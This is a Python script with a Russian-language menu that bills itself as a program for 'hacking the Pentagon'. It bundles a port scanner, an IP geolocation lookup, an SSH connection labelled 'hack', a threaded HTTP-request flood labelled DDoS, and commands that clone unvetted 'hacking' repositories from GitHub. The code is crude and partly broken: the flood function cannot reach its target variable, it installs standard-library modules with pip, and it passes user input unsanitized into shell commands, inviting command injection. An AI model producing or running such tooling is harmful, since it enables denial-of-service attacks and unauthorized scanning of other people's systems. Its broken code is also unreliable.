import os
print("INSTALLING...")
os.system("pip3 install socket")
os.system("pip3 install requests")
os.system("pip3 install threading")
os.system("apt install git")
print("IMPORTING...")
import threading
import socket
import requests
os.system("clear")
def dos():
  while True:
  	requests.get(syte)
  
def ddos():
 syte = input("введите сайт: ")
 while True:
 	threading.Thread(target=dos).start()
def scan_portt(ipp,port):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.settimeout(0.5)
  try:
     connect = sock.connect((ipp,port))
     print('Port :',port,' its open.')
     sock.close()
  except:
     pass
def scan_port():
	ip_scan = input("введите ip адрес: ")
	for i in range(1000):
		scan_portt(ip_scan,i)
	
def test_ip(ip='127.0.0.1'):
	result = requests.get(url=f'http://ip-api.com/json/{ip}').json()
	print(" ")
	print("результаты сканирования:")
	print(" ")
	print(result)
	main()
def scan_ip():
	ip = input("введите ip адрес")
	test_ip(ip=ip)
def hack():
	name = input("введите имя пользователя: ")
	ip_adress = input("введите ip адрес")
	port = input("введите порт")
	os.system("ssh " + name + "@" + ip_adress + "-p" + port)
	main()
def ping():
	site = input("введите ссылку на сайт: ")
	os.system("ping " + site + "&& return")
	main()
def main():
	print("супер мега крутая прога для взлома пентагона. выберите действие:")
	print("1 - получение ip адреса сайта")
	print("2 - пробив по ip адресу")
	print("3- подключение через ssh(взлом)")
	print("4 - сканировать открытые порты")
	print("5 - линукс")
	print("6 - ddos")
	print("7 - upgrade programm")
	print("8 - установить другие проги для взлома")
	kom = input("введите команду: ")
	if kom == "1" :
		ping()
	if kom == "2" :
		scan_ip()
	if kom == "3" :
		hack()
	if kom == "4" :
		scan_port()
	if kom == "5" :
		os.system("sh")
	if kom == "6" :
		ddos()
	if kom == "7" :
		os.system("git clone https://github.com/chiter777228/hacking.git")
	if kom == "8" :
		os.system("git clone https://github.com/acker228666/chm.git")
		main()
		
	print("неизвестная команда")
	main()
if __name__ == "__main__" :
		main()
		
